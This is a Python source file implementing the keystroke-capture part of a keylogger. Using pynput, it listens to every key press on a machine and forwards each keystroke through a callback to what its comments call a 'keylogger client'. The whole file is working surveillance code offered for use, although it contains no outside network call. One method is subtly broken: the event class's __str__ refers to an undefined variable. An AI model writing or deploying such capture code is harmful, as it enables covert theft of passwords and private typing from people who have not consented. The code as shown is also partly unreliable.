from pynput import keyboard
import logging

'''
    Helper Class to start capturing the key strokes on client keyboard
'''


class Keylogger:

    def __init__(self):
        # another way to define function here logger will be a function which take one argument
        # and always return true we have done this to make an event so when ever a key is pressed
        # an event will fire which will be captured by keylogger_client
        self.logger = lambda x: True
        self.key_pressed = ''

    '''
        A callback method which is called everytime when a pressed key
        is released
    '''

    def on_release(self, key):
        logging.debug('{} release'.format(key))
        self.logger(self.key_press_event(key))  # Event call back to client class

    '''
        A callback method which is called everytime a key is pressed
        on a keyboard
    '''

    def on_press(self, key):
        try:
            logging.debug('{} key pressed'.format(key.char))
        except AttributeError:
            logging.debug('{} key pressed'.format(key))

    '''
        helper method to get particular string depeding on the 
        key stroke made by the user
    '''

    def switch_key_stoke(self, key):
        switcher = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.shift: '',
            keyboard.Key.shift_r: '',
            keyboard.Key.right: '',
            keyboard.Key.left: '',
            keyboard.Key.up: '',
            keyboard.Key.down: '',
            keyboard.Key.page_down: '',
            keyboard.Key.page_up: '',
            keyboard.Key.home: '',
            keyboard.Key.end: '',
            keyboard.Key.ctrl: '',
            keyboard.Key.ctrl_r: '',
            keyboard.Key.alt: '',
            keyboard.Key.alt_r: '',
            keyboard.Key.print_screen: '',
            keyboard.Key.insert: '',
            keyboard.Key.backspace: '',
            keyboard.Key.delete: ''
        }
        return switcher.get(key, key if isinstance(key, keyboard.Key) else key.char)

    '''
        helper method to create an event and send to client class
    '''

    def key_press_event(self, key):
        keyString = self.switch_key_stoke(key)
        return KeyboardEvent(keyString)

    '''
        Utiltility method to start capturing the keystrokes on 
        the keyboard
    '''

    def start(self):
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
        ) as listener:
            listener.join()


'''
    class to make event that will be bind to keylogger
    client class
'''


class KeyboardEvent:

    def __init__(self, key):
        self.key = key

    def __str__(self):
        return str(key)
